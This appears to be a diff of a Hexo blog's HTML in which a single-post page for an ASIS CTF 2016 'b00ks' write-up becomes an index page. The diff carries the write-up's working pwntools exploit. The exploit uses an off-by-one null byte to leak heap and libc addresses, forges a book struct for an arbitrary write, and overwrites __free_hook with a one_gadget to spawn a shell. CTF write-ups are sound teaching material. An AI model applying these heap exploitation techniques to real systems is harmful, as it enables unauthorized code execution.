@@ -20,38 +20,28 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Environment12Ubuntu 16.04glibc 2.23  Analysis功能一個書籍管理系統，具有新增、刪除、更改作者名等功能 保護機制 Reverse Engineeringbook struct此系統用以下的struct保存書籍資訊，並使用一個陣列books儲存每個book中的book_name pointer 12345struct book&#123;    char *">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ASIS CTF 2016 b00ks">
-<meta property="og:url" content="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Terry1234&#39;s blog">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Terry1234&#39;s blog">
-<meta property="og:description" content="Environment12Ubuntu 16.04glibc 2.23  Analysis功能一個書籍管理系統，具有新增、刪除、更改作者名等功能 保護機制 Reverse Engineeringbook struct此系統用以下的struct保存書籍資訊，並使用一個陣列books儲存每個book中的book_name pointer 12345struct book&#123;    char *">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/menu.png">
-<meta property="og:image" content="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/checksec.png">
-<meta property="og:image" content="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/bss.png">
-<meta property="og:image" content="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/result.png">
-<meta property="article:published_time" content="2023-02-07T11:41:44.000Z">
-<meta property="article:modified_time" content="2025-09-08T11:46:48.986Z">
 <meta property="article:author" content="Terry1234">
-<meta property="article:tag" content="CTF writeup">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/menu.png">
 
-<link rel="canonical" href="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/">
+<link rel="canonical" href="http://example.com/page/2/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : false,
-    isPost : true,
+    isHome : true,
+    isPost : false,
     lang   : 'en'
   };
 </script>
 
-  <title>ASIS CTF 2016 b00ks | Terry1234's blog</title>
+  <title>Terry1234's blog</title>
   
 
 
@@ -155,10 +145,9 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content index posts-expand">
             
-
-    
+      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -174,9 +163,10 @@
       <meta itemprop="name" content="Terry1234's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          ASIS CTF 2016 b00ks
-        </h1>
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/07/ASIS-CTF-2016-b00ks/" class="post-title-link" itemprop="url">ASIS CTF 2016 b00ks</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -206,7 +196,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04</span><br><span class="line">glibc 2.23</span><br></pre></td></tr></table></figure>
+          <h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04</span><br><span class="line">glibc 2.23</span><br></pre></td></tr></table></figure>
 
 <h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>一個書籍管理系統，具有新增、刪除、更改作者名等功能<br><img src="/2023/02/07/ASIS-CTF-2016-b00ks/menu.png"></p>
 <h3 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h3><p><img src="/2023/02/07/ASIS-CTF-2016-b00ks/checksec.png"></p>
@@ -230,34 +220,25 @@
 <h3 id="exploit-script"><a href="#exploit-script" class="headerlink" title="exploit script"></a>exploit script</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_author_name</span>(<span class="params">author</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">	p.sendline(author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size, name, description_size, description</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(description_size))</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, description</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author_name</span>(<span class="params">author</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	send_author_name(author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use off by one null to leak heap address</span></span><br><span class="line">send_author_name(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="number">0x100</span>, <span class="string">b&#x27;b&#x27;</span>) <span class="comment"># bool 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># book 2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Author: &#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0x20</span>:-<span class="number">1</span>] + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a fake book in book1 (the offset is found by debugging)</span></span><br><span class="line"><span class="comment"># let the description pointer of fake book points to book 2 fd, leak libc address</span></span><br><span class="line"><span class="comment"># set the size of description bigger (I set it to 0x10000), for further exploitation</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span> - <span class="number">0x40</span>) + p64(<span class="number">0x1</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x8</span> + p64(heap_addr + <span class="number">0x50</span>) + p64(<span class="number">0x10000</span>))</span><br><span class="line">change_author_name(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">main_arena = u64(p.recvline()[:-<span class="number">1</span>] + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x2</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span>, <span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free_hook = libc_base  + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the description pointer of fake book points to the description of book3</span></span><br><span class="line"><span class="comment"># since we set the size of description of fake chunk to 0x10000, we can control the description pointer of book3</span></span><br><span class="line"><span class="comment"># we can arbitrary write now!</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x500</span> + <span class="number">0x8</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x3</span>) + p64(heap_addr + <span class="number">0x30</span>) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload1)</span><br><span class="line">edit(<span class="number">3</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger one gadget</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="/2023/02/07/ASIS-CTF-2016-b00ks/result.png"></p>
 
+      
     </div>
 
     
     
     
-
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF-writeup/" rel="tag"># CTF writeup</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2023/07/13/starctf-oob/" rel="next" title="starctf oob writeup">
-      starctf oob writeup <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
+        <div class="post-eof"></div>
       </footer>
-    
   </article>
   
   
   
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
 
 
 
@@ -309,7 +290,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Environment"><span class="nav-number">1.</span> <span class="nav-text">Environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">2.</span> <span class="nav-text">Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD"><span class="nav-number">2.1.</span> <span class="nav-text">功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="nav-number">2.2.</span> <span class="nav-text">保護機制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-Engineering"><span class="nav-number">2.3.</span> <span class="nav-text">Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#book-struct"><span class="nav-number">2.3.1.</span> <span class="nav-text">book struct</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#input-function"><span class="nav-number">2.3.2.</span> <span class="nav-text">input function</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#author-name"><span class="nav-number">2.3.3.</span> <span class="nav-text">author name</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%80%E5%AF%9F"><span class="nav-number">3.1.</span> <span class="nav-text">觀察</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">3.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-script"><span class="nav-number">3.3.</span> <span class="nav-text">exploit script</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
